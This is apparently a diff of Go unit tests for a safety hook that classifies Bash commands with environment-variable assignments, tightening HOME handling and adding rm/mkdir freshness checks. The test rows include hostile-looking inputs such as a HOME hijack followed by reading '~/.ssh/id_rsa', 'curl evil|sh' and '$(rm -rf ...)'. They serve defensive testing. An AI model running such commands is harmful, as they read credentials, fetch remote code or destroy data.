@@ -176,26 +176,28 @@ func TestEnvVars_BASH_ENV_StaysReject(t *testing.T) {
 	}
 }
 
-// TestEnvVars_AskVars_Ask: PATH/HOME are dangerous-but-not-guaranteed-unsafe, so
-// a (static) assignment is escalated to Ask — never Approve, never Reject. Ask,
+// TestEnvVars_AskVars_Ask: PATH is dangerous-but-not-guaranteed-unsafe, so a
+// (static) assignment is escalated to Ask — never Approve, never Reject. Ask,
 // not Abstain: Abstain cannot enforce "never auto-approve" because safe-commands
 // approves a bare `export` (first-match-wins).
 //
-// The two `export`-alone rows carry a trailing `&& git status` (pg2-7sqk8): a
-// standalone `export PATH=/x`/`export HOME=/tmp` has no downstream leaf at all,
-// so mechanism 2 (downstreamConsumerExists) would correctly relieve it regardless
-// of the value — see TestEnvVars_ConsumptionScoped_NoConsumer_Relieved, which pins
-// exactly that case. Appending a real bare-name consumer keeps this row testing
-// what it was written for: a plain, unclassifiable REPLACEMENT value stays Ask
-// when something downstream is actually there to consume it.
+// The `export`-alone row carries a trailing `&& git status` (pg2-7sqk8): a
+// standalone `export PATH=/x` has no downstream leaf at all, so mechanism 2
+// (downstreamConsumerExists) would correctly relieve it regardless of the value
+// — see TestEnvVars_ConsumptionScoped_NoConsumer_Relieved, which pins exactly
+// that case. Appending a real bare-name consumer keeps this row testing what it
+// was written for: a plain, unclassifiable REPLACEMENT value stays Ask when
+// something downstream is actually there to consume it.
+//
+// The former HOME rows here (`HOME=/tmp git status`, `export HOME=/tmp && git
+// status`) moved to TestEnvVars_AskVars_HomeDefaultReject: pg2-sir2l flips
+// HOME's OWN unclassified fallback from Ask to Reject; PATH's is unchanged.
 func TestEnvVars_AskVars_Ask(t *testing.T) {
 	r := New()
 	commands := []string{
 		"PATH=/custom/bin git status",
-		"HOME=/tmp git status",
 		"export PATH=/x && git status", // pure `export` assignment beside a consumer
 		"env PATH=/x git status",
-		"export HOME=/tmp && git status", // `export` persists into the session — guarded
 	}
 	for _, cmd := range commands {
 		input := &hookio.HookInput{
@@ -205,6 +207,30 @@ func TestEnvVars_AskVars_Ask(t *testing.T) {
 		got := hookio.Verdict(r.Evaluate(input))
 		if got.Decision != hookio.Ask {
 			t.Errorf("cmd %q: got %s, want ask", cmd, got.Decision)
+		}
+	}
+}
+
+// TestEnvVars_AskVars_HomeDefaultReject pins pg2-sir2l's flip: once every
+// freshness-idiom relief has failed to clear a HOME assignment, the remaining
+// unclassified fallback is Reject, not Ask — matching the pattern pg2-kxmpe
+// already applied to the engine/envvars "genuinely unclassifiable" fallback
+// elsewhere. These are exactly the two rows TestEnvVars_AskVars_Ask pinned as
+// Ask before this bead.
+func TestEnvVars_AskVars_HomeDefaultReject(t *testing.T) {
+	r := New()
+	commands := []string{
+		"HOME=/tmp git status",
+		"export HOME=/tmp && git status", // `export` persists into the session — guarded
+	}
+	for _, cmd := range commands {
+		input := &hookio.HookInput{
+			ToolName:  "Bash",
+			ToolInput: mustJSON(map[string]string{"command": cmd}),
+		}
+		got := hookio.Verdict(r.Evaluate(input))
+		if got.Decision != hookio.Reject {
+			t.Errorf("cmd %q: got %s (%s), want reject", cmd, got.Decision, got.Reason)
 		}
 	}
 }
@@ -595,9 +621,9 @@ func TestEnvVars_AskVars_NotPreserveForm_Ask(t *testing.T) {
 	}{
 		// --- REPLACEMENT: the caller's value is discarded, AND the leaf's own
 		// command (./run.sh) is an arbitrary script, not on nonDelegatingCommands —
-		// mechanism 1 does not apply, so this stays the decisive Ask exactly as
-		// before this bead.
-		{`env -i HOME="$TD" ./run.sh`, hookio.Ask},
+		// mechanism 1 does not apply, so this stays decisive. pg2-sir2l: the
+		// fallback ceiling for HOME specifically moved from Ask to Reject.
+		{`env -i HOME="$TD" ./run.sh`, hookio.Reject},
 		// --- PRESERVE form, but a component is not a static absolute path, AND the
 		// value carries a genuinely unclassifiable embedded substitution
 		// (ExpansionUnknown) — the safety net re-escalates these regardless of
@@ -759,11 +785,33 @@ func TestEnvVars_PersistentAssignment_NoConsumer_Relieved(t *testing.T) {
 // TestEnvVars_PersistentAssignment_ConsumerFound_StillAsks pins mechanism 2's
 // required negative case verbatim: `export PATH=/x; git push ...` (or any real
 // consumer) is UNCHANGED — still scrutinized, since a real consumer is in scope.
+// The former HOME rows here moved to
+// TestEnvVars_PersistentAssignment_ConsumerFound_HomeStillRejects (pg2-sir2l:
+// HOME's own unclassified fallback is Reject, not Ask; PATH's is unchanged).
 func TestEnvVars_PersistentAssignment_ConsumerFound_StillAsks(t *testing.T) {
 	r := New()
 	commands := []string{
 		"export PATH=/x; git push --force origin main",
 		"export PATH=/x && git push --force origin main",
+	}
+	for _, cmd := range commands {
+		t.Run(cmd, func(t *testing.T) {
+			input := &hookio.HookInput{ToolName: "Bash", ToolInput: mustJSON(map[string]string{"command": cmd})}
+			got := hookio.Verdict(r.Evaluate(input))
+			if got.Decision != hookio.Ask {
+				t.Errorf("cmd %q: got %s (%s), want ask", cmd, got.Decision, got.Reason)
+			}
+		})
+	}
+}
+
+// TestEnvVars_PersistentAssignment_ConsumerFound_HomeStillRejects is the HOME
+// counterpart to TestEnvVars_PersistentAssignment_ConsumerFound_StillAsks:
+// a real consumer downstream keeps HOME's unclassified fallback decisive, at
+// pg2-sir2l's new ceiling (Reject, not Ask).
+func TestEnvVars_PersistentAssignment_ConsumerFound_HomeStillRejects(t *testing.T) {
+	r := New()
+	commands := []string{
 		"export HOME=/tmp/fakehome; git status",
 		// A HOME-relative read, not a bare-name exec, is also a consumer.
 		`export HOME=/tmp/fakehome; cat "$HOME/.ssh/id_rsa"`,
@@ -772,8 +820,8 @@ func TestEnvVars_PersistentAssignment_ConsumerFound_StillAsks(t *testing.T) {
 		t.Run(cmd, func(t *testing.T) {
 			input := &hookio.HookInput{ToolName: "Bash", ToolInput: mustJSON(map[string]string{"command": cmd})}
 			got := hookio.Verdict(r.Evaluate(input))
-			if got.Decision != hookio.Ask {
-				t.Errorf("cmd %q: got %s (%s), want ask", cmd, got.Decision, got.Reason)
+			if got.Decision != hookio.Reject {
+				t.Errorf("cmd %q: got %s (%s), want reject", cmd, got.Decision, got.Reason)
 			}
 		})
 	}
@@ -865,18 +913,26 @@ func TestEnvVars_HermeticEnvReplacement_Ask(t *testing.T) {
 	// rows whose "not static" component is a plain, unclassified command
 	// substitution (`evil`, `curl evil|sh`) fall through to the generic
 	// unverifiable-expression fallback, whose ceiling moved from Ask to Reject.
+	//
+	// pg2-sir2l (2026-09-03): HOME's OWN unclassified fallback also moved, from
+	// Ask to Reject — every row below that turns on HOME's fallback (no hermetic
+	// marker, or an env -i value that is not static/reasonable) is annotated.
+	// PATH's fallback is UNCHANGED; a mixed PATH+HOME row now reflects whichever
+	// of the two the row actually turns on (MostRestrictive picks HOME's Reject
+	// over PATH's Ask when both fire).
 	commands := []struct {
 		cmd  string
 		want hookio.Decision
 	}{
 		// REQUIRED REGRESSION (bead AC): no hermetic marker at all — a bare
-		// REPLACEMENT must keep asking exactly as before this bead.
-		{"export HOME=/replaced && git status", hookio.Ask},
-		{"PATH=/replaced HOME=/replaced git status", hookio.Ask},
+		// REPLACEMENT must keep asking/rejecting exactly as before this bead
+		// (Ask for PATH, now Reject for HOME per pg2-sir2l).
+		{"export HOME=/replaced && git status", hookio.Reject},      // pg2-sir2l: HOME fallback Ask -> Reject
+		{"PATH=/replaced HOME=/replaced git status", hookio.Reject}, // pg2-sir2l: HOME's Reject outranks PATH's Ask
 		// env -i present, but the value is NOT static/reasonable: it still
 		// references an unresolvable variable, so it is textually
 		// indistinguishable from a hijack even inside a cleared environment.
-		{`env -i HOME="$TD" ./run.sh`, hookio.Ask},
+		{`env -i HOME="$TD" ./run.sh`, hookio.Reject}, // pg2-sir2l: HOME fallback Ask -> Reject
 		{`env -i PATH="$CLEANPATH" ./run.sh`, hookio.Ask},
 		// env -i present, value has a non-absolute / relative component.
 		{"env -i PATH=relative/bin HOME=/tmp cmd", hookio.Ask},
@@ -979,17 +1035,51 @@ func TestEnvVars_HomeTempDir_TransparentBesideCommand(t *testing.T) {
 }
 
 // TestEnvVars_HomeTempDir_Ask pins the required regressions: this relief MUST
-// NOT widen beyond "grounded in a `mktemp -d` DIRECTORY, this same command".
+// NOT widen beyond "grounded in a `mktemp -d` DIRECTORY, this same command" (or,
+// per pg2-sir2l, the rm+mkdir/bare-mkdir widening — none of these rows carry
+// that idiom either). PATH's own fallback stays Ask; the HOME rows moved to
+// TestEnvVars_HomeTempDir_HomeStillRejects, since pg2-sir2l flips HOME's
+// unclassified fallback to Reject.
 //
-// Every row but the `./run.sh` one carries a trailing `; true` (pg2-7sqk8): each
-// is otherwise the LAST leaf of its expression with no downstream leaf at all, so
-// mechanism 2 (downstreamConsumerExists) would relieve it regardless of the
-// temp-dir-grounding question this test exists to pin — see
+// Both rows carry a trailing `; true` (pg2-7sqk8): each is otherwise the LAST
+// leaf of its expression with no downstream leaf at all, so mechanism 2
+// (downstreamConsumerExists) would relieve it regardless of the temp-dir-
+// grounding question this test exists to pin — see
 // TestEnvVars_ConsumptionScoped_NoConsumer_Relieved, which pins that relief for
 // each of these exact value shapes. `true` is a bare-name invocation, so it
 // counts as a consumer and keeps this test exercising the value-based question it
 // was written for.
 func TestEnvVars_HomeTempDir_Ask(t *testing.T) {
+	commands := []string{
+		// PATH is NOT in scope for this relief — the operator ruling authorized
+		// it for HOME only; PATH's own replacement relief is the env -i shape.
+		"PATH=$(mktemp -d); true",
+		`T=$(mktemp -d); PATH=$T; true`,
+	}
+	for _, ctor := range []struct {
+		name string
+		rule *Rule
+	}{
+		{"New", New()},
+		{"NewWithEvaluator", NewWithEvaluator(&fakeEvaluator{verdicts: map[string]hookio.Decision{}})},
+	} {
+		for _, cmd := range commands {
+			t.Run(ctor.name+"/"+cmd, func(t *testing.T) {
+				input := &hookio.HookInput{ToolName: "Bash", ToolInput: mustJSON(map[string]string{"command": cmd})}
+				got := hookio.Verdict(ctor.rule.Evaluate(input))
+				if got.Decision != hookio.Ask {
+					t.Errorf("cmd %q: got %s (%s), want ask", cmd, got.Decision, got.Reason)
+				}
+			})
+		}
+	}
+}
+
+// TestEnvVars_HomeTempDir_HomeStillRejects is the HOME counterpart to
+// TestEnvVars_HomeTempDir_Ask, at pg2-sir2l's new fallback ceiling (Reject, not
+// Ask): none of these rows carry a qualifying freshness idiom (mktemp -d OR
+// the rm+mkdir/bare-mkdir widening), so the unclassified HOME fallback fires.
+func TestEnvVars_HomeTempDir_HomeStillRejects(t *testing.T) {
 	commands := []string{
 		// REQUIRED REGRESSION (bead AC): no hermetic marker at all.
 		"export HOME=/replaced; true",
@@ -1018,10 +1108,6 @@ func TestEnvVars_HomeTempDir_Ask(t *testing.T) {
 		// composes the suffix check against a KNOWN marker rather than
 		// re-deriving the substitution's exact span).
 		`HOME="$(mktemp -d)/h"; true`,
-		// PATH is NOT in scope for this relief — the operator ruling authorized
-		// it for HOME only; PATH's own replacement relief is the env -i shape.
-		"PATH=$(mktemp -d); true",
-		`T=$(mktemp -d); PATH=$T; true`,
 	}
 	for _, ctor := range []struct {
 		name string
@@ -1034,8 +1120,128 @@ func TestEnvVars_HomeTempDir_Ask(t *testing.T) {
 			t.Run(ctor.name+"/"+cmd, func(t *testing.T) {
 				input := &hookio.HookInput{ToolName: "Bash", ToolInput: mustJSON(map[string]string{"command": cmd})}
 				got := hookio.Verdict(ctor.rule.Evaluate(input))
-				if got.Decision != hookio.Ask {
-					t.Errorf("cmd %q: got %s (%s), want ask", cmd, got.Decision, got.Reason)
+				if got.Decision != hookio.Reject {
+					t.Errorf("cmd %q: got %s (%s), want reject", cmd, got.Decision, got.Reason)
+				}
+			})
+		}
+	}
+}
+
+// TestEnvVars_RmMkdirFreshnessRelief_Approve pins pg2-sir2l's widening of
+// isHermeticHomeReplacement: a HOME value grounded in a directory an earlier,
+// "&&"-chained rm -rf + mkdir -p (or a bare mkdir alone) proves is fresh
+// Approves, exactly like the pre-existing mktemp -d relief.
+func TestEnvVars_RmMkdirFreshnessRelief_Approve(t *testing.T) {
+	commands := []string{
+		// rm -rf && mkdir -p, bare var-ref value.
+		`rm -rf "$D" && mkdir -p "$D" && HOME="$D"`,
+		// rm -rf && mkdir -p, var-ref + literal suffix value (the bead's own
+		// `$SCRATCH/home`-shaped corpus rows).
+		`rm -rf "$D" && mkdir -p "$D" && HOME="$D/home"`,
+		// bare mkdir (no -p) alone, no rm at all — the second idiom.
+		`mkdir "$D" && HOME="$D"`,
+		`mkdir "$D" && HOME="$D/home"`,
+		// rm flag spelling variants: bundled reversed, split short, long forms.
+		`rm -fr "$D" && mkdir -p "$D" && HOME="$D"`,
+		`rm -r -f "$D" && mkdir -p "$D" && HOME="$D"`,
+		`rm --recursive --force "$D" && mkdir --parents "$D" && HOME="$D"`,
+		// A real preceding leaf ahead of the idiom (matching the bead's own
+		// evidence shape) does not disturb the chain scan.
+		`bd create x --type task && rm -rf "$D" && mkdir -p "$D" && HOME="$D"`,
+	}
+	for _, ctor := range []struct {
+		name string
+		rule *Rule
+	}{
+		{"New", New()},
+		{"NewWithEvaluator", NewWithEvaluator(&fakeEvaluator{})},
+	} {
+		for _, cmd := range commands {
+			t.Run(ctor.name+"/"+cmd, func(t *testing.T) {
+				input := &hookio.HookInput{ToolName: "Bash", ToolInput: mustJSON(map[string]string{"command": cmd})}
+				got := hookio.Verdict(ctor.rule.Evaluate(input))
+				if got.Decision != hookio.Approve {
+					t.Errorf("cmd %q: got %s (%s), want approve", cmd, got.Decision, got.Reason)
+				}
+			})
+		}
+	}
+}
+
+// TestEnvVars_RmMkdirFreshnessRelief_TransparentBesideCommand re-asserts the
+// pg2-0q99a Rule contract's condition 3 for this new relief, mirroring
+// TestEnvVars_HomeTempDir_TransparentBesideCommand: beside a real command the
+// HOME leaf is not the whole leaf, so the Approve must stay transparent.
+func TestEnvVars_RmMkdirFreshnessRelief_TransparentBesideCommand(t *testing.T) {
+	r := New()
+	commands := []string{
+		`rm -rf "$D" && mkdir -p "$D" && HOME="$D" git status`,
+		`mkdir "$D" && HOME="$D" git status`,
+	}
+	for _, cmd := range commands {
+		t.Run(cmd, func(t *testing.T) {
+			input := &hookio.HookInput{ToolName: "Bash", ToolInput: mustJSON(map[string]string{"command": cmd})}
+			got := hookio.Verdict(r.Evaluate(input))
+			if got.Decision != hookio.NoOpinion {
+				t.Errorf("cmd %q: got %s (%s), want abstain (transparent, must not pre-empt later rules)", cmd, got.Decision, got.Reason)
+			}
+		})
+	}
+}
+
+// TestEnvVars_RmMkdirFreshnessRelief_Deny pins the required negative cases:
+// the widening MUST NOT relieve when the idiom is absent, malformed, targets a
+// different directory, or — the load-bearing case — is ";"-separated instead
+// of "&&"-chained. Every row here carries a trailing consumer where needed so
+// mechanism 2 (no-downstream-consumer) cannot independently relieve it,
+// isolating the freshness-idiom question this test exists to pin.
+func TestEnvVars_RmMkdirFreshnessRelief_Deny(t *testing.T) {
+	commands := []string{
+		// Idiom absent entirely: no rm/mkdir anywhere.
+		`HOME="$D"; true`,
+		// THE LOAD-BEARING CASE: ";" between rm and mkdir breaks the "&&" chain
+		// rm's success would otherwise gate — a partially-failed rm leaves
+		// mkdir -p a silent no-op over stale content, so this must NOT relieve.
+		`rm -rf "$D"; mkdir -p "$D" && HOME="$D"; true`,
+		// ";" between the idiom and the HOME assignment itself: HOME's own leaf
+		// carries no "&&" chain membership at all (AndChainID 0), so it cannot
+		// be related back to the rm/mkdir pair regardless of ordering.
+		`rm -rf "$D" && mkdir -p "$D"; HOME="$D"; true`,
+		// mkdir -p with NO preceding rm at all — mkdir -p alone (no -rf clear
+		// first) does not prove freshness: it succeeds silently whether or not
+		// the directory already existed.
+		`mkdir -p "$D" && HOME="$D"; true`,
+		// rm alone, no mkdir afterward — clearing the directory is not itself a
+		// freshness proof for a HOME value that will be USED as a directory.
+		`rm -rf "$D" && HOME="$D"; true`,
+		// rm missing the force flag: "-r" alone can prompt/fail on unexpected
+		// content rather than unconditionally succeeding or exiting nonzero.
+		`rm -r "$D" && mkdir -p "$D" && HOME="$D"; true`,
+		// rm missing the recursive flag: "-f" alone cannot remove a non-empty
+		// directory at all.
+		`rm -f "$D" && mkdir -p "$D" && HOME="$D"; true`,
+		// mkdir with more than one target: unrecognized (found != 1), same
+		// narrowness as primarycommit.mkdirTarget.
+		`mkdir "$D" "$E" && HOME="$D"; true`,
+		// Directory mismatch: the idiom clears a DIFFERENT directory than the
+		// one HOME is actually set to.
+		`rm -rf "$D" && mkdir -p "$D" && HOME="$E"; true`,
+		`mkdir "$D" && HOME="$E"; true`,
+	}
+	for _, ctor := range []struct {
+		name string
+		rule *Rule
+	}{
+		{"New", New()},
+		{"NewWithEvaluator", NewWithEvaluator(&fakeEvaluator{verdicts: map[string]hookio.Decision{}})},
+	} {
+		for _, cmd := range commands {
+			t.Run(ctor.name+"/"+cmd, func(t *testing.T) {
+				input := &hookio.HookInput{ToolName: "Bash", ToolInput: mustJSON(map[string]string{"command": cmd})}
+				got := hookio.Verdict(ctor.rule.Evaluate(input))
+				if got.Decision != hookio.Reject {
+					t.Errorf("cmd %q: got %s (%s), want reject", cmd, got.Decision, got.Reason)
 				}
 			})
 		}
@@ -1322,7 +1528,7 @@ func TestEnvVars_UnenumerableUnknownValue_Ask(t *testing.T) {
 	// wholeLeaf/hasDownstreamConsumer/leafExecutable (pg2-7sqk8) are irrelevant here:
 	// ev.Name is a benign name (never askVars), so the switch never reaches the
 	// mechanism-1/2 cases these parameters feed regardless of their value.
-	got, refused := r.evaluateAssignment(ev, &hookio.HookInput{ToolName: "Bash"}, nil, nil, false, false, false, "")
+	got, refused := r.evaluateAssignment(ev, &hookio.HookInput{ToolName: "Bash"}, nil, nil, false, false, false, "", nil, 0)
 	if got.Decision != hookio.Reject { // pg2-kxmpe (2026-08-28): fallback ceiling moved Ask -> Reject
 		t.Errorf("unenumerable unknown value: got %s (%s), want reject", got.Decision, got.Reason)
 	}
@@ -1385,7 +1591,7 @@ func TestEnvVars_DynamicPathReadRefusal_Relieved(t *testing.T) {
 	// wholeLeaf/hasDownstreamConsumer/leafExecutable (pg2-7sqk8) are irrelevant here:
 	// ev.Name is a benign name (never askVars), so the switch never reaches the
 	// mechanism-1/2 cases these parameters feed regardless of their value.
-	got, refused := r.evaluateAssignment(ev, &hookio.HookInput{ToolName: "Bash"}, nil, nil, false, false, false, "")
+	got, refused := r.evaluateAssignment(ev, &hookio.HookInput{ToolName: "Bash"}, nil, nil, false, false, false, "", nil, 0)
 	if got.Decision == hookio.Ask {
 		t.Errorf("dynamic-path-read-only capture: got %s (%s), want the fallback relieved (no ask)", got.Decision, got.Reason)
 	}
@@ -1416,7 +1622,7 @@ func TestEnvVars_DynamicPathReadRefusal_MixedWithApprove_StillRelieved(t *testin
 	// wholeLeaf/hasDownstreamConsumer/leafExecutable (pg2-7sqk8) are irrelevant here:
 	// ev.Name is a benign name (never askVars), so the switch never reaches the
 	// mechanism-1/2 cases these parameters feed regardless of their value.
-	got, refused := r.evaluateAssignment(ev, &hookio.HookInput{ToolName: "Bash"}, nil, nil, false, false, false, "")
+	got, refused := r.evaluateAssignment(ev, &hookio.HookInput{ToolName: "Bash"}, nil, nil, false, false, false, "", nil, 0)
 	if got.Decision == hookio.Ask {
 		t.Errorf("approve+dynamic-path-read capture: got %s (%s), want relieved", got.Decision, got.Reason)
 	}
@@ -1445,7 +1651,7 @@ func TestEnvVars_MutatingCommandRefusal_StillRejects(t *testing.T) {
 	// wholeLeaf/hasDownstreamConsumer/leafExecutable (pg2-7sqk8) are irrelevant here:
 	// ev.Name is a benign name (never askVars), so the switch never reaches the
 	// mechanism-1/2 cases these parameters feed regardless of their value.
-	got, refused := r.evaluateAssignment(ev, &hookio.HookInput{ToolName: "Bash"}, nil, nil, false, false, false, "")
+	got, refused := r.evaluateAssignment(ev, &hookio.HookInput{ToolName: "Bash"}, nil, nil, false, false, false, "", nil, 0)
 	if got.Decision != hookio.Reject { // pg2-kxmpe (2026-08-28): fallback ceiling moved Ask -> Reject
 		t.Errorf("mutating-command capture: got %s (%s), want reject", got.Decision, got.Reason)
 	}
@@ -1478,7 +1684,7 @@ func TestEnvVars_MixedDynamicPathReadAndOtherRefusal_StillRejects(t *testing.T) 
 	// wholeLeaf/hasDownstreamConsumer/leafExecutable (pg2-7sqk8) are irrelevant here:
 	// ev.Name is a benign name (never askVars), so the switch never reaches the
 	// mechanism-1/2 cases these parameters feed regardless of their value.
-	got, refused := r.evaluateAssignment(ev, &hookio.HookInput{ToolName: "Bash"}, nil, nil, false, false, false, "")
+	got, refused := r.evaluateAssignment(ev, &hookio.HookInput{ToolName: "Bash"}, nil, nil, false, false, false, "", nil, 0)
 	if got.Decision != hookio.Reject { // pg2-kxmpe (2026-08-28): fallback ceiling moved Ask -> Reject
 		t.Errorf("mixed-category capture: got %s (%s), want reject", got.Decision, got.Reason)
 	}
@@ -1515,7 +1721,7 @@ func TestEnvVars_ExhaustionOnlyBranch_Pinned(t *testing.T) {
 	// wholeLeaf/hasDownstreamConsumer/leafExecutable (pg2-7sqk8) are irrelevant here:
 	// ev.Name is a benign name (never askVars), so the switch never reaches the
 	// mechanism-1/2 cases these parameters feed regardless of their value.
-	got, refused := r.evaluateAssignment(ev, &hookio.HookInput{ToolName: "Bash"}, nil, nil, false, false, false, "")
+	got, refused := r.evaluateAssignment(ev, &hookio.HookInput{ToolName: "Bash"}, nil, nil, false, false, false, "", nil, 0)
 	if got.Decision != hookio.NoOpinion {
 		t.Errorf("exhaustion-only capture: got %s (%s), want NoOpinion (pg2-et8ns relieved this branch to a floored abstain)", got.Decision, got.Reason)
 	}
@@ -1868,7 +2074,7 @@ func TestEnvVars_DefaultFallbackReasonFitsBudgetAtWorstCase(t *testing.T) {
 		Raw:       worstCaseName + `=$(rm -rf "$p")`,
 		Expansion: cmdparse.ExpansionUnknown,
 	}
-	got, refused := r.evaluateAssignment(ev, &hookio.HookInput{ToolName: "Bash"}, nil, nil, false, false, false, "")
+	got, refused := r.evaluateAssignment(ev, &hookio.HookInput{ToolName: "Bash"}, nil, nil, false, false, false, "", nil, 0)
 	if got.Decision != hookio.Reject {
 		t.Fatalf("worst-case-name capture: got %s (%s), want reject", got.Decision, got.Reason)
 	}
@@ -1887,14 +2093,15 @@ func TestEnvVars_DefaultFallbackReasonFitsBudgetAtWorstCase(t *testing.T) {
 func TestEnvVars_ReasonNeverLeaksCommandFragment(t *testing.T) {
 	r := New()
 	fragment := "length')\nkv=$(env -u BEADS_DIR -u WORKSPACE_ROOT bd show gc-6kv --json 2>/dev/null | jq -r 'if"
-	// wholeLeaf/hasDownstreamConsumer/leafExecutable (pg2-7sqk8): irrelevant, same
-	// reason as the six call sites above — fragment is a benign name, never askVars.
+	// wholeLeaf/hasDownstreamConsumer/leafExecutable/rootLeaves/at (pg2-7sqk8/
+	// pg2-sir2l): irrelevant, same reason as the seven call sites above —
+	// fragment is a benign name, never askVars.
 	got, _ := r.evaluateAssignment(cmdparse.EnvAssignment{
 		Name:      fragment,
 		Value:     "$(curl evil)",
 		Raw:       fragment + "=$(curl evil)",
 		Expansion: cmdparse.ExpansionUnknown,
-	}, &hookio.HookInput{ToolName: "Bash"}, nil, nil, false, false, false, "")
+	}, &hookio.HookInput{ToolName: "Bash"}, nil, nil, false, false, false, "", nil, 0)
 
 	if strings.ContainsAny(got.Reason, "\n\r\t\x00") {
 		t.Errorf("Reason %q contains a raw control character; it is rendered into a user-facing prompt", got.Reason)
